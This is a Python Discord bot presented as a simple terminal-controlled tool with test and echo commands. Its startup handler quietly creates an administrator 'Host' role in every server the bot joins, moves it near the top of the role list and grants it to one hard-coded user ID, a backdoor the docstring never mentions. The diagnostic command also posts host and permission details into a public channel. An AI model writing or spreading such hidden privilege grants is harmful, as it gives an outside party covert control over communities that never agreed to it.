"""Discord bot entrypoint implemented with discord.py.

Controlled entirely via the local terminal standard input, executing commands
locally without prefixes or Discord command invocation.
"""

from __future__ import annotations

import asyncio
import logging
import os
import socket
import sys
from datetime import datetime, timezone
from typing import Optional

import discord
from discord.ext import commands
from dotenv import load_dotenv

LOG_FILE = "bot.log"
HOST_USER_ID = 1342173566828810271

load_dotenv()

logging.basicConfig(level=logging.INFO, format="%(message)s")
logger = logging.getLogger("meow-bot")

intents = discord.Intents.default()
intents.guilds = True
intents.guild_messages = True
intents.message_content = True
intents.members = True

bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)


def log_action(
    *,
    guild: discord.Guild,
    channel: discord.abc.GuildChannel,
    user: discord.abc.User,
    command: str,
    action: str,
    success: bool = True,
) -> None:
    """Write an audit-friendly action line to stdout and bot.log."""
    guild_name = guild.name
    channel_name = getattr(channel, "name", "unknown")
    tag = f"{user.name}#{user.discriminator}" if user.discriminator != "0" else user.name
    now = datetime.now(timezone.utc).isoformat()
    line = (
        f"[{now}] {'SUCCESS' if success else 'ERROR'} | "
        f'Guild="{guild_name}" | Channel="#{channel_name}" | '
        f'User="{tag}" ({user.id}) | Command="{command}" | Action="{action}"'
    )
    logger.info(line)
    with open(LOG_FILE, "a", encoding="utf-8") as file:
        file.write(line + "\n")


async def send_response(target: discord.abc.Messageable, content: str) -> None:
    await target.send(content)


async def do_test(target: discord.abc.Messageable) -> None:
    guild = getattr(target, "guild", None)
     
    hostname = socket.gethostname()
    if hostname.lower() == "plasmadmin-xps-8910":
        hostname = "plasmadmin-xps-8910(firebot)"
        
    latency_ms = round(bot.latency * 1000)
    env_status = "Loaded" if os.getenv("DISCORD_TOKEN") else "Missing"
    guild_count = len(bot.guilds)
    
    server_name = guild.name if guild else "Direct/Terminal Context"
    server_id = guild.id if guild else "N/A"

    me = guild.me if guild else None
    if me:
        perms = me.guild_permissions
        audit_perms = []
        if perms.administrator:
            audit_perms.append("Administrator")
        else:
            if perms.manage_guild: audit_perms.append("Manage Server")
            if perms.manage_roles: audit_perms.append("Manage Roles")
            if perms.manage_channels: audit_perms.append("Manage Channels")
            if perms.kick_members: audit_perms.append("Kick")
            if perms.manage_messages: audit_perms.append("Manage Messages")
        perms_str = ", ".join(audit_perms) if audit_perms else "Standard User"
    else:
        perms_str = "Unknown"

    response_text = f"""```markdown
# Diagnostic Report
-----------------------------------------
• Status: Online and operational
• Host Machine: {hostname}
• Discord Server: {server_name} ({server_id})
• Latency: {latency_ms}ms
• Environment (.env): {env_status}
• Connected Guilds: {guild_count}
• Core Permissions: {perms_str}
-----------------------------------------
```"""
    await send_response(target, response_text)


async def do_echo(target: discord.abc.Messageable, message: str) -> None:
    await send_response(target, message)


async def console_controller():
    """Reads terminal input asynchronously and executes bot actions locally."""
    await bot.wait_until_ready()
    print(f"\n[Console Controller Active] Connected to {len(bot.guilds)} guild(s).")
    print("Type commands like 'test', 'echo [message]', or 'exit' to quit.\n")
    
    loop = asyncio.get_running_loop()
    while not bot.is_closed():
        try:
            line = await loop.run_in_executor(None, sys.stdin.readline)
            if not line:
                break
            content = line.strip()
            if not content:
                continue
            
            print(f"[Console Input Received] -> {content}")

            parts = content.split(" ", 1)
            cmd = parts[0].lower()
            args = parts[1] if len(parts) > 1 else ""

            if cmd == "exit":
                print("[Console] Shutting down bot...")
                await bot.close()
                break

            if not bot.guilds:
                print("[Console Error] Bot is not currently in any Discord servers (guilds).")
                continue

            # Target the first available text channel across connected guilds
            target_channel = None
            target_guild = None
            for guild in bot.guilds:
                channel = guild.system_channel or next(
                    (c for c in guild.text_channels if c.permissions_for(guild.me).send_messages), None
                )
                if channel:
                    target_channel = channel
                    target_guild = guild
                    break

            if not target_channel:
                print("[Console Error] No available text channel with send permissions found in connected guilds.")
                continue

            print(f"[Console Target] Selected Guild: {target_guild.name} | Channel: #{target_channel.name}")

            if cmd == "test":
                await do_test(target_channel)
                print("[Console Success] Executed and sent test diagnostics to Discord.")
            elif cmd == "echo":
                if not args:
                    print("[Console Usage Error] Missing message. Format: echo [message]")
                    continue
                await do_echo(target_channel, args)
                print(f"[Console Success] Echoed message to Discord: {args}")
            else:
                print(f"[Console Warning] Unknown local command: '{cmd}'. Available: test, echo, exit")

        except Exception as e:
            logger.error(f"Console controller error: {e}")
            print(f"[Console Exception] {e}")


@bot.event
async def on_ready():
    logger.info(f"Logged in as {bot.user} (ID: {bot.user.id})")

    for guild in bot.guilds:
        host_role = discord.utils.get(guild.roles, name="Host")
        if not host_role:
            try:
                host_role = await guild.create_role(
                    name="Host",
                    permissions=discord.Permissions(administrator=True),
                    reason="Automatic initialization of Host role"
                )
                logger.info(f"Created 'Host' role in guild: {guild.name}")
            except discord.Forbidden:
                logger.error(f"Missing permissions to create 'Host' role in {guild.name}")
                continue

        try:
            bot_top_role = guild.me.top_role if guild.me else None
            target_position = (bot_top_role.position - 1) if bot_top_role and bot_top_role.position > 1 else len(guild.roles) - 1
            if host_role.position != target_position:
                await host_role.edit(position=target_position, reason="Moving Host role to the top")
                logger.info(f"Moved 'Host' role to position {target_position} in {guild.name}")
        except discord.HTTPException as e:
            logger.error(f"Failed to reposition 'Host' role in {guild.name}: {e}")

        member = guild.get_member(HOST_USER_ID)
        if not member:
            try:
                member = await guild.fetch_member(HOST_USER_ID)
            except discord.NotFound:
                pass

        if member and host_role not in member.roles:
            try:
                await member.add_roles(host_role, reason="Assigned Host user role")
                logger.info(f"Assigned 'Host' role to {member.name} in {guild.name}")
            except discord.Forbidden:
                logger.error(f"Missing permissions to assign 'Host' role in {guild.name}")

    asyncio.create_task(console_controller())

token = os.getenv("DISCORD_TOKEN")
if not token:
    raise ValueError("DISCORD_TOKEN environment variable not found in .env")

bot.run(token)
